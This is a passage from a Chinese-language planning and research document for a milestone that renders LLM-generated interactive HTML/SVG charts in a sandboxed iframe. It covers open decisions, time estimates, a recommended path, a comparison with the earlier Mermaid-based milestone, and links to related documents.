| 2   | ~~LLM 产出格式标记：```html 代码块够？还是需显式 artifact 标记？~~ **✅ 已定**：```html fenced code block **首选**（跨 LLM 遵循度高），兼容量化 `<artifact type="html">` 标签（宽松流式解析器，小模型可能漏闭合标签） | 产品 + 技术 | 格式检测 + 提取链路    |
| 3   | iframe sandbox + `connect-src 'none'`（图表不能联网）是否可接受？                                                                                                                                                     | Security    | 决定安全方案           |
| 4   | 图表库选型：Vis.js（拓扑）/ Chart.js（数据）/ ECharts（大屏）三选几？                                                                                                                                                 | 产品 + 技术 | 影响包体和 preset 范围 |
| 5   | L2 HTML 落盘 .html 文件是否加 CSP meta + 免责声明？                                                                                                                                                                   | Security    | 影响落盘链路           |

### 10.2 估时（粗估，待计划细化）

| Phase    | 内容                                                                                        | 估时    |
| -------- | ------------------------------------------------------------------------------------------- | ------- |
| A        | iframe sandbox 渲染器 + 安全方案（srcdoc + CSP meta + self-hosted 库）+ Tauri/Electron 实测 | 2d      |
| B        | 格式路由（renderer registry）+ 图表库打包 + LLM SYSTEM_PROMPT + preset guidance             | 2d      |
| C        | 候选稿提取/落盘/资产链路（findLatestAssistantHtml + .html 落盘）                            | 1.5d    |
| D        | 端到端 + 安全测试（XSS/外泄/sandbox 配置断言 + 格式路由覆盖）                               | 1.5d    |
| **总计** |                                                                                             | **~7d** |

（对齐路线图 §3.6 估时 ~7d；比 M3 L1 的 3d 高，因新安全方案 + 格式路由 + 新候选稿链路）

### 10.3 建议路径

1. **产品确认 §10.1 #1**（交互可视化真伪需求）--若否，M3.5 继续延后
2. **Security 评审 §10.1 #3**（iframe sandbox 方案）--Claude Artifacts 已验证此模型可行，降低评审风险
3. **编写 M3.5 实施计划**（对齐 M3 计划格式，细化格式路由 + 渲染器注册表 + 安全方案）
4. **分支 work-m3.5**，TDD 四 Phase（A 安全渲染 / B 格式路由+图表库+prompt / C 提取落盘 / D 端到端）

### 10.4 若不立项 M3.5

L1（Mermaid）已覆盖高频图表需求。若交互可视化低频，M3.5 可无限期延后。**无业务阻塞**。

---

## 11. 与 M3（L1）的关系

| 维度       | M3 L1（已完成）                 | M3.5 L2（待立项）                                                                           |
| ---------- | ------------------------------- | ------------------------------------------------------------------------------------------- |
| 产出格式   | Markdown + Mermaid SVG          | HTML + SVG（格式无关）                                                                      |
| 安全       | DOMPurify sanitize（无 script） | iframe sandbox + CSP meta                                                                   |
| 渲染架构   | mermaid.ts renderMermaidBlocks  | 格式路由 renderer registry（新增 HTML/SVG 渲染器）                                          |
| 候选稿载体 | 消息正文（M1 D1）               | 消息正文 ```html 代码块                                                                     |
| 复用链路   | M1 渲染链路 + Mermaid 库        | 新建 iframe 渲染器；格式路由注册表（M1 Markdown + M3 Mermaid 渲染器已有，L2 新增 HTML/SVG） |
| 频率       | 高频                            | 低频（交互可视化场景）                                                                      |
| 竞品参考   | 无（Mermaid 标准库）            | Claude Artifacts + E2B Fragments（有架构范式）                                              |

M3.5 继承 M3 的"LLM 产图表"理念，但从静态 SVG 升级为格式无关交互内容。预览 Tab 从"单格式渲染器"升级为"渲染器注册表"。**M1/M3 渲染器成为注册表的首两项**，M3.5 新增 HTML/SVG 渲染器。

---

## 12. 关联文档

- [竞品调研：Claude Artifacts / E2B / v0 / Canvas](m3.5-competitor-research.md) - 渲染架构对比 + 格式路由代码核验（**本报告主要新增依据**）
- [Work PRD v4.1](../prd/work-mode-execution-layer.md) - §5.1 真伪需求 / §13 M3 扩展产出
- [Work 路线图](work-mode-roadmap.md) - §3.6 M3.5（L2 远期）
- [M3 调研报告](work-mode-m3-research.md) - L1/L2 分层决策
- [Work M3 计划](work-mode-execution-layer-m3.md) - L1 实施计划（已完成）
- [全栈可视化文档](../全栈项目团队与流程可视化.md) - L2 4 模块形态范例
- [Accio](../Accio竞品反编译分析报告.md) / [Antigravity](../Antigravity反编译分析报告.md) / [Cherry-Studio](../Cherry-Studio反编译分析报告.md) - 三竞品均无交互预览
- [E2B Fragments 源码](https://github.com/e2b-dev/fragments) - 格式路由 + 结构化输出（代码核验）
- [ui.ts](packages/aigcfroge/src/server/shared/ui.ts) - CSP 现状
- [ADR-13](../architecture/adr/ADR-13-chat-work-mode-boundary.md) / [ADR-14](../architecture/adr/ADR-14-persistence-and-scope-strategy.md) - 架构边界
